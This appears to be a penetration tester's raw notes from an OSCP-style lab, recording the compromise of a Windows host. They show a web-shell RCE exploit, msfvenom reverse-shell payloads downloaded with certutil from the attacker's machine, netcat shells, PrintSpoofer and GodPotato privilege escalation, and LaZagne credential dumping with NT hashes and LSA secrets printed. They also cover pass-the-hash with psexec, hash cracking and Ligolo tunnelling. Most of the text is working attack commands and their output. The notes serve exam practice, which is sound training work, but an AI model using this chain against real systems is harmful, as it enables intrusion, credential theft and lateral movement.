@@ -1,0 +1,3251 @@
+ 				OSCP A
+--------------------------------------------------------------------------------------------------
+				IPS:
+INTERNAL 
+DC01: 10.10.185.140
+MS02: 10.10.185.142
+
+EXTERNAL
+MS01: 192.168.225.141
+Aero: 192.168.225.143
+Crystal: 192.168.225.144
+Hermes: 192.168.225.145
+
+--------------------------------------------------------------------------------------------------
+				MS01: 192.168.214.141
+NMAP: 
+- SSH: 22
+- HTTP: 80, 5985, 47001
+- mysql: 3306
+
+					TCP:
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.225.141
+
+22/tcp    open  ssh             syn-ack OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHi6qqQGQteAgLLakGf2MPORvtZSeF1gAL03sfUo/E/jsObuAOjzHPfw1OIfAyctU/gv17d0sz17kGDXbg4In4vxlnavXxnB/L2ipQLhAkFLo1YZLLwyUs0j1jiSW65Ax12A20nH0F3hbuqKsuWIPywR9XXc0cwhyY3ET06ZCbVVvP8ChGMd97uZTDeZtrnskYMXmqnfQpOGPL6e022+K5ud3MboyYXTlD0rGyVHyLCCXeg9QdxsVR5mZ8hSVCrwdX8Q4tb4kLYi+wpPx1KCirHEk/8O8I7YuA5KR4AeaMVSlqUhlm9MXaNw+5WZD2xOue0ZPCx2gxgKgndoUDfAagZrHr3dzgMUDgUnKTbtL/EIZdyzKh5C1TrN+yplSpqYjK975Q1qas7SUmzanN9S/PnhFFer/0j6hTtGlRalbxX12i2ifC0314ifnHY3Zz+2VD49RARArwvZR+7KcGKP+5tpCl9IyVf1xSKFFnJ0cQdhuAgJnkCfQXaQLHTzqSbys=
+|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOpOTM37eUD8SUKAqFVSNV8ECDl5yUqV7a41c39cXyPE6EMeNbKxWvQDoTw+WEYArHFAEj3SZbFupIZoZmvjFuA=
+|   256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICyZUVdHOqTpEFyvELlmc7sCN1XFXQo7RdZdTRTPO2uJ
+
+80/tcp    open  http            syn-ack Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
+|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
+| http-methods: 
+|   Supported Methods: HEAD GET POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-generator: Nicepage 4.8.2, nicepage.com
+|_http-title: Home
+81/tcp    open  http            syn-ack Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
+|_http-title: Attendance and Payroll System
+|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+5985/tcp  open  http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+MYSQL: 
+3306/tcp  open  mysql           syn-ack MySQL (unauthorized)
+3307/tcp  open  opsession-prxy? syn-ack
+| fingerprint-strings: 
+|   NULL, SharpTV, apple-iphoto, riak-pbc: 
+|_    Host '192.168.45.157' is not allowed to connect to this MariaDB server
+
+SMB:
+139/tcp   open  netbios-ssn     syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?   syn-ack
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2024-05-04T01:19:24
+|_  start_date: N/A
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 20847/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 15323/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 61563/udp): CLEAN (Timeout)
+|   Check 4 (port 23775/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+RPC:
+135/tcp   open  msrpc           syn-ack Microsoft Windows RPC
+49664/tcp open  msrpc           syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc           syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc           syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc           syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc           syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc           syn-ack Microsoft Windows RPC
+49670/tcp open  msrpc           syn-ack Microsoft Windows RPC
+58599/tcp open  msrpc           syn-ack Microsoft Windows RPC
+
+5040/tcp  open  unknown         syn-ack
+
+7680/tcp  open  pando-pub?      syn-ack
+
+
+				UDP:
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sU -O 192.168.214.141
+123/udp  open|filtered ntp
+137/udp  open|filtered netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+1900/udp open|filtered upnp
+4500/udp open|filtered nat-t-ike
+5050/udp open|filtered mmcc
+5353/udp open|filtered zeroconf
+5355/udp open|filtered llmnr
+
+
+				HTTP: 80 81 5985 47001
+http://192.168.214.141/
+http://192.168.214.141:81
+
+HTTP Error 404. The requested resource is not found.
+http://192.168.214.141:5985
+http://192.168.214.141:47001
+
+WAPPALIZER:
+Font scripts
+- Google Font API
+Miscellaneous
+- Open Graph
+Web servers
+- Apache HTTP Server 2.4.51
+Programming languages
+- PHP 7.4.26
+Operating systems
+- Windows Server
+Page builder
+- Nicepage 4.8.2
+JavaScript libraries
+- Skrollr- 0.6.30
+- LazySizes
+- jQuery 3.5.1
+Performance
+- LazySizes
+
+STAFF:
+Nate Reynolds: Financial Director
+Celia Almeda: Sales Manager
+Tom Kinney: IT Manager
+
+# EXPLOITS: 
+SEARCHSPLOIT: 
+Apache 2.4.51
+Nicepage 4.8.2
+PHP 7.4.26
+GOOGLE: 
+
+# DIR BRUTEFORCE:
+feroxbuster -u http://192.168.214.141 -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+http://192.168.214.141/images/
+http://192.168.214.141/blog/
+
+http://192.168.214.141/Script/
+http://192.168.214.141/script/GPO.ps1
+http://192.168.214.141/Script/how%20to%20use%20the%20program.txt
+
+				group-policy-object-gpos
+https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#group-policy-object-gpos
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/gpo-abuse
+
+
+				http://192.168.214.141:81
+Web servers
+- Microsoft HTTPAPI 2.0
+- Apache HTTP Server 2.4.51
+
+view-source:http://192.168.214.141:81/
+  $('#attendance').submit(function(e){
+    e.preventDefault();
+    var attendance = $(this).serialize();
+    $.ajax({
+      type: 'POST',
+      url: 'attendance.php',
+      data: attendance,
+      dataType: 'json',
+      success: function(response){
+        if(response.error){
+          $('.alert').hide();
+          $('.alert-danger').show();
+          $('.message').html(response.message);
+        }
+        else{
+          $('.alert').hide();
+          $('.alert-success').show();
+          $('.message').html(response.message);
+          $('#employee').val('');
+
+http://192.168.214.141:81/attendance.php
+
+# EXPLOITS: 
+SEARCHSPLOIT: 
+GOOGLE: 
+
+# DIR BRUTEFORCE:
+feroxbuster -u http://192.168.214.141:81/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+http://192.168.214.141:81/Attendance
+http://192.168.214.141:81/attendance.php
+
+http://192.168.214.141:81/conn
+http://192.168.214.141:81/conn.php
+__construct( $host = 'localhost', $user = 'root', $password = '', $database = 'apsystem' )	
+
+http://192.168.214.141:81/timezone
+http://192.168.214.141:81/timezone.php
+
+http://192.168.214.141:81/IMAGES/
+http://192.168.214.141:81/Build/
+http://192.168.214.141:81/Dist/
+http://192.168.214.141:81/Plugins 
+
+
+http://192.168.214.141:81/DB/
+http://192.168.214.141:81/DB/apsystem.sql
+-- phpMyAdmin SQL Dump
+-- Dumping data for table `admin`
+INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
+(1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
+
+-- Dumping data for table `employees`
+INSERT INTO `employees` (`id`, `employee_id`, `firstname`, `lastname`, `address`, `birthdate`, `contact_info`, `gender`, `position_id`, `schedule_id`, `photo`, `created_on`) VALUES
+(1, 'ABC123456789', 'Neovic', 'Devierte', 'Brgy. Mambulac, Silay City', '2018-04-02', '09092735719', 'Male', 1, 2, 'desktop.jpg', '2018-04-28'),
+(3, 'DYE473869250', 'Julyn', 'Divinagracia', 'E.B. Magalona', '1992-05-02', '09123456789', 'Female', 2, 2, '', '2018-04-30'),
+(4, 'JIE625973480', 'Gemalyn', 'Cepe', 'Carmen, Bohol', '1995-10-02', '09468029840', 'Female', 2, 3, '', '2018-04-30');
+
+
+http://192.168.214.141:81/Admin/index.php
+http://192.168.214.141:81/Admin/
+nurhodelta:$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK
+admin	
+
+
+				3306/tcp  open  mysql 
+Testing sqli in every input field: 
+';#---
+
+
+		Attendance and Payroll System v1.0 - Remote Code Execution (RCE)
+			https://www.exploit-db.com/exploits/50801
+
+┌──(kali㉿kali)-[~/Desktop/A/141]
+└─$ chmod +x 50801.py
+
+┌──(kali㉿kali)-[~/Desktop/A/141]
+└─$ python3 50801.py http://192.168.214.141:81
+
+    >> Attendance and Payroll System v1.0
+    >> Unauthenticated Remote Code Execution
+    >> By pr0z
+
+[*] Uploading the web shell to http://192.168.214.141:81/
+[*] Validating the shell has been uploaded to http://192.168.214.141:81/
+[x] Something unexpected happened
+
+
+You can read the lines 40-45 and do some needed changes
+upload_path = '/admin/employee_edit_photo.php'
+shell_path = '/images/shell.php'
+
+
+┌──(kali㉿kali)-[~/Desktop/A/141]
+└─$ sudo python3 50801.py http://192.168.214.141:81                
+
+    >> Attendance and Payroll System v1.0
+    >> Unauthenticated Remote Code Execution
+    >> By pr0z
+
+[*] Uploading the web shell to http://192.168.214.141:81
+[*] Validating the shell has been uploaded to http://192.168.214.141:81
+[✓] Successfully connected to web shell
+
+RCE > whoami
+ms01\mary.williams
+
+RCE > powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+PS C:\wamp64\attendance\images> 
+
+RCE > dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3C99-887F
+ Directory of C:\wamp64\attendance\images
+05/06/2024  03:41 AM    <DIR>          .
+05/06/2024  03:41 AM    <DIR>          ..
+04/01/2022  05:46 AM           351,474 desktop.jpg
+04/01/2022  05:46 AM             4,240 facebook-profile-image.jpeg
+04/01/2022  05:46 AM            26,644 profile.jpg
+05/06/2024  03:41 AM                78 shell.php
+               4 File(s)        382,436 bytes
+               2 Dir(s)  10,270,269,440 bytes free
+
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.229 LPORT=81 -f exe > reverse.exe
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ python3 -m http.server 80
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 81
+
+
+RCE > certutil.exe -urlcache -split -f "http://192.168.45.229:80/reverse.exe" reverse.exe
+****  Online  ****
+  000000  ...
+  01204a
+CertUtil: -URLCache command completed successfully.
+
+RCE > dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3C99-887F
+ Directory of C:\wamp64\attendance\images
+05/06/2024  03:45 AM    <DIR>          .
+05/06/2024  03:45 AM    <DIR>          ..
+04/01/2022  05:46 AM           351,474 desktop.jpg
+04/01/2022  05:46 AM             4,240 facebook-profile-image.jpeg
+04/01/2022  05:46 AM            26,644 profile.jpg
+05/06/2024  03:45 AM            73,802 reverse.exe
+05/06/2024  03:41 AM                78 shell.php
+               5 File(s)        456,238 bytes
+               2 Dir(s)  10,270,097,408 bytes free
+
+RCE > .\reverse.exe
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 81
+listening on [any] 81 ...
+connect to [192.168.45.229] from (UNKNOWN) [192.168.214.141] 53929
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\wamp64\attendance\images>whoami
+whoami
+ms01\mary.williams
+
+C:\Users> powershell -ep bypass
+
+
+				PRIV ESC:
+PS C:\Users\Mary.Williams\Desktop> whoami /priv
+whoami /priv
+PRIVILEGES INFORMATION
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+			SeImpersonatePrivilege: 
+# God Potato: CANT RUN COMMANDS: can only move through directories 
+┌──(kali㉿kali)-[~/Desktop/WINDOWS-PRIV]
+└─$ python3 -m http.server 80
+
+PS C:\Users\Mary.Williams\Downloads> certutil.exe -urlcache -split -f "http://192.168.45.229/GodPotato-NET4.exe" GodPotato2.exe
+PS C:\Users\Mary.Williams\Downloads> certutil.exe -urlcache -split -f "http://192.168.45.229/nc64.exe" nc64.exe
+
+PS C:\Users\Mary.Williams\Downloads> .\GodPotato2.exe -cmd "C:\Users\Mary.Williams\Downloads\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.229 2560"
+
+┌──(kali㉿kali)-[~/Desktop/WINDOWS-PRIV]
+└─$ nc -nvlp 2560
+listening on [any] 2560 ...
+connect to [192.168.45.229] from (UNKNOWN) [192.168.214.141] 53946
+
+
+# PrintSpoofer64: WORKED 
+┌──(kali㉿kali)-[~/Desktop/WINDOWS-PRIV]
+└─$ python3 -m http.server 80
+
+PS C:\Users\Mary.Williams\Downloads> certutil.exe -urlcache -split -f "http://192.168.45.229/PrintSpoofer64.exe" print.exe
+
+PS C:\Users\Mary.Williams\Downloads> .\print.exe -i -c powershell.exe
+.\print.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+
+PS C:\Users> hostname
+hostname
+MS01
+
+PS C:\Users> net users
+net users
+User accounts for \\
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+Mary.Williams            support                  WDAGUtilityAccount    
+
+
+PS C:\Users> net users /domain 
+net users /domain 
+The request will be processed at a domain controller for domain oscp.exam.
+User accounts for \\DC01.oscp.exam
+-------------------------------------------------------------------------------
+Administrator            Aimee.Hunt               Carol.Webb               
+celia.almeda             Chelsea.Byrne            Donna.Johnson            
+Emily.Bishop             Frank.Farrell            Georgina.Begum           
+Guest                    Jamie.Thomas             Jane.Booth               
+Janice.Turner            Joan.North               john.dorian              
+Kenneth.Coles            krbtgt                   Lawrence.Kay             
+Leonard.Morris           Linda.Patel              Luke.Martin              
+Oliver.Gray              Sandra.Craig             Shane.Mitchell           
+sql_svc                  Thomas.Robinson          tom.kinney               
+tom_admin                web_svc                  
+The command completed with one or more errors.
+
+
+PS C:\Users> net group /domain 
+net group /domain 
+The request will be processed at a domain controller for domain oscp.exam.
+Group Accounts for \\DC01.oscp.exam
+-------------------------------------------------------------------------------
+*admin
+*Cloneable Domain Controllers
+*DnsUpdateProxy
+*Domain Admins
+*Domain Computers
+*Domain Controllers
+*Domain Guests
+*Domain Users
+*Enterprise Admins
+*Enterprise Key Admins
+*Enterprise Read-only Domain Controllers
+*finance
+*Group Policy Creator Owners
+*hr
+*IT
+*Key Admins
+*marketing
+*Protected Users
+*Read-only Domain Controllers
+*Schema Admins
+
+net group "admin" / domain 
+
+PS C:\Users> systeminfo
+Host Name:                 MS01
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19044 N/A Build 19044
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          offsec
+Registered Organization:   
+Product ID:                00331-10000-00001-AA390
+Original Install Date:     3/25/2022, 6:55:24 AM
+System Boot Time:          3/30/2024, 12:34:58 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+
+
+
+				INTERESTING FILES: 
+PS C:\Users> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+
+				CREDS: 
+PS C:\Users> (Get-PSReadlineOption).HistorySavePath
+C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Users> type C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+because it does not exist.
+
+certutil.exe -urlcache -split -f "http://192.168.45.229:80/LaZagne.exe" laz.exe
+.\laz.exe all
+
+PS C:\Users\Mary.Williams> .\laz.exe all
+.\laz.exe all
+[+] System masterkey decrypted for 233ec4f0-427e-4365-81f1-eb0113562a7b
+[+] System masterkey decrypted for 9577d491-234f-4cc7-bda6-c7cb787def4f
+[+] System masterkey decrypted for 98e7f77d-8897-4d55-935d-61f8a68c56ec
+[+] System masterkey decrypted for bdba25ce-60c3-4414-bd18-0b98d962eb85
+########## User: SYSTEM ##########
+------------------- Hashdump passwords -----------------
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+------------------- Pypykatz passwords -----------------
+[+] Shahash found !!!
+Shahash: 8cb61017910862af238631bf7aaae38df64998cd
+Nthash: e728ecbadfb02f51ce8eed753f3ff3fd
+Login: celia.almeda
+[+] Shahash found !!!
+Shahash: 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
+Nthash: 9a3121977ee93af56ebd0ef4f527a35e
+Login: Mary.Williams
+[+] Shahash found !!!
+Shahash: 1191d73dc2f0c0fe8604509a14a745c1d7df5a8c
+Nthash: ab35b4830656a96e07160b7c6258ebbf
+Login: MS01$
+------------------- Lsa_secrets passwords -----------------
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   A0 0C 21 A2 35 AB CE 6A D0 08 AD 99 5D 3D 6F A9    ..!.5..j....]=o.
+0020   9D E9 C3 E2 E8 B6 25 42 7E 1F 0B A5 07 5A AE 68    ......%B~....Z.h
+0030   E5 A1 36 BF B8 72 8A A9 0D 6C 85 72 21 E7 B4 3D    ..6..r...l.r!..=
+0040   94 DF 36 04 09 75 23 51 63 31 04 25 DC 95 90 A9    ..6..u#Qc1.%....
+0050   FD 9B 75 45 E2 28 85 22 D6 A9 41 70 76 78 16 0E    ..uE.(."..Apvx..
+0060   58 92 34 D1 94 FD F0 B6 18 B5 B1 03 EB F8 E2 A0    X.4.............
+0070   A9 35 6A AB 37 57 0D B6 20 EC B3 71 B1 E4 CB 5C    .5j.7W.. ..q....
+0080   1C 97 05 02 53 E4 FD 55 21 93 C7 8C EA A2 40 02    ....S..U!.....@.
+0090   91 91 4B C8 CB 1F 57 F3 B6 5E 19 7A 53 B1 15 02    ..K...W..^.zS...
+00A0   7E 5E 21 7C C8 42 76 D4 D4 FB 18 2D 4C 3F 98 B0    ~^!|.Bv....-L?..
+00B0   42 55 CD 6F 13 ED 31 7F 63 80 18 31 23 5E 47 91    BU.o..1.c..1#^G.
+00C0   EC 45 B7 3E 5F 04 D6 54 EB 8E 16 5D AE B4 B6 29    .E.>_..T...]...)
+00D0   B5 09 EC 0D 22 3D E0 C6 99 03 EA 64 39 1D 19 68    ...."=.....d9..h
+00E0   B0 3C F9 01 EA 13 B7 30 8B 6E 41 32 2E 05 27 7A    .<.....0.nA2..'z
+00F0   50 E6 37 2C 19 10 17 C3 05 61 31 BE 0D 12 0A A7    P.7,.....a1.....
+0100   16 E4 31 52 C7 F0 40 A8 2B 1C 42 2C B1 80 65 87    ..1R..@.+.B,..e.
+DefaultPassword
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   37 00 6B 00 38 00 58 00 48 00 6B 00 33 00 64 00    7.k.8.X.H.k.3.d.
+0020   4D 00 74 00 6D 00 70 00 6E 00 43 00 37 00 00 00    M.t.m.p.n.C.7...
+DPAPI_SYSTEM
+0000   01 00 00 00 14 CC 9A CC BB 06 D4 AF 8F 07 29 57    ..............)W
+0010   49 93 3B 06 CF 0D 6D FD 4C 31 EB 80 2E 35 29 D3    I.;...m.L1...5).
+0020   4F 19 8A 04 73 A6 74 5C F5 94 85 27                O...s.t....'
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   F1 9F 8D 0A 3D 6B 2D 13 69 96 2E 4C 32 4D C3 66    ....=k-.i..L2M.f
+0020   D5 36 97 AB 1F 0B F2 38 11 3E DF 05 AE DF 31 70    .6.....8.>....1p
+0030   C0 E3 97 A0 08 31 A9 2A E3 88 48 DD 2C 88 86 56    .....1.*..H.,..V
+0040   83 C9 79 90 03 D5 9D 28 C1 BE 33 D6 0E 7B B7 9B    ..y....(..3..{..
+0050   76 FF 4E 76 F0 C3 6D 1D 2B 88 24 F9 96 B9 0E A1    v.Nv..m.+.$.....
+_SC_wampapache64
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   36 00 39 00 6A 00 48 00 77 00 6A 00 47 00 4E 00    6.9.j.H.w.j.G.N.
+0020   32 00 62 00 50 00 51 00 46 00 76 00 4A 00 00 00    2.b.P.Q.F.v.J...
+_SC_wampmariadb64
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   36 00 39 00 6A 00 48 00 77 00 6A 00 47 00 4E 00    6.9.j.H.w.j.G.N.
+0020   32 00 62 00 50 00 51 00 46 00 76 00 4A 00 00 00    2.b.P.Q.F.v.J...
+_SC_wampmysqld64
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   36 00 39 00 6A 00 48 00 77 00 6A 00 47 00 4E 00    6.9.j.H.w.j.G.N.
+0020   32 00 62 00 50 00 51 00 46 00 76 00 4A 00 00 00    2.b.P.Q.F.v.J...
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey 00117a9c-2478-4b95-9d25-d118f61e4855
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey 1d5ba668-d4a2-471f-815b-42bee0e11194
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey 41f83c69-427c-437a-aa77-425b95341799
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey 512039eb-68c4-4713-97b0-06b111c6361e
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey 7b5adfbf-b3cc-40f6-9a57-6ed64f476c59
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey 8889066d-f7c7-4cdf-a4da-7524ac9c492a
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey 95dbdaa7-1791-4ad3-b1c4-cdf0ab484a2d
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey a2e790d0-7665-4cb5-b23b-f48948f83927
+[+] 4b1beca6645e6c3edb991248bcd992ec2a90fbb5 ok for masterkey edcf3578-afa9-418e-a2e2-6ab72236e2fb
+[+] 3 passwords have been found.
+
+
+				ACCESS: 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b Administrator@192.168.246.141
+
+				CRACK HASHES
+Login: celia.almeda
+Nthash: e728ecbadfb02f51ce8eed753f3ff3fd
+
+Login: Mary.Williams
+Nthash: 9a3121977ee93af56ebd0ef4f527a35e
+
+Login: MS01$
+Nthash: ab35b4830656a96e07160b7c6258ebbf
+
+┌──(kali㉿kali)-[~/Desktop/A/141]
+└─$ nano celia.hash
+                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/A/141]
+└─$ nano mary.hash   
+
+# HASHCAT:
+kali@kali:~/passwordattacks$ hashcat -m 1000 celia.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+kali@kali:~/passwordattacks$ hashcat -m 1000 mary.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+Status...........: Exhausted
+
+hashcat -m 1000 celia.hash /usr/share/wordlists/rockyou.txt 
+hashcat -m 1000 mary.hash /usr/share/wordlists/rockyou.txt
+Status...........: Exhausted
+
+# JOHN: 
+john --format=NT celia.hash --wordlist=/usr/share/wordlists/rockyou.txt
+john --format=NT mary.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+0g 0:00:00:00 DONE (2024-05-06 21:16) 0g/s 17708Kp/s 17708Kc/s 17708KC/s      markinho..*7¡Vamos!
+Session completed. 
+
+
+				TUNNELING: 
+PS C:\Users> ipconfig /all
+ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : MS01
+   Primary Dns Suffix  . . . . . . . : oscp.exam
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : oscp.exam
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-80-E8
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.214.141(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.214.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+Ethernet adapter Ethernet1:
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
+   Physical Address. . . . . . . . . : 00-50-56-AB-D9-AF
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.174.141(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+   DNS Servers . . . . . . . . . . . : 10.10.174.140
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+
+PS C:\Users> nslookup
+nslookup
+DNS request timed out.
+    timeout was 2 seconds.
+Default Server:  UnKnown
+Address:  10.10.174.140
+
+					# Ligolo
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+
+┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/AGENT(VIC)/WINDOWSamd64]
+└─$ python3 -m http.server 8000
+PS C:\Users\Administrator\Downloads> iwr -uri http://192.168.45.226:8000/agent.exe -Outfile agent.exe
+PS C:\Users\Administrator\Downloads> ./agent -connect 192.168.45.226:11601 -ignore-cert
+
+[Agent : RELIA\jim@WK01] » session
+[Agent : RELIA\jim@WK01] » 1
+
+┌──(kali㉿kali)-[~]
+└─$ sudo ip route add 10.10.174.0/24 dev ligolo
+┌──(kali㉿kali)-[~]
+└─$ ip route
+
+[Agent : RELIA\jim@WK01] » start
+[Agent : RELIA\jim@WK01] » tunnel_list
+
+sudo ip route del 10.10.174.0/24
+sudo ip route add 10.10.206.0/24 dev ligolo
+
+--------------------------------------------------------------------------------------------------
+				10.10.206.140
+DNS:53
+KERBEROS: 88
+LDAP: 389 3268
+HTTP: 5985
+RPC: 135
+SMB: 139 445
+
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.206.140
+
+DNS:
+53/tcp    open  domain        syn-ack Simple DNS Plus
+
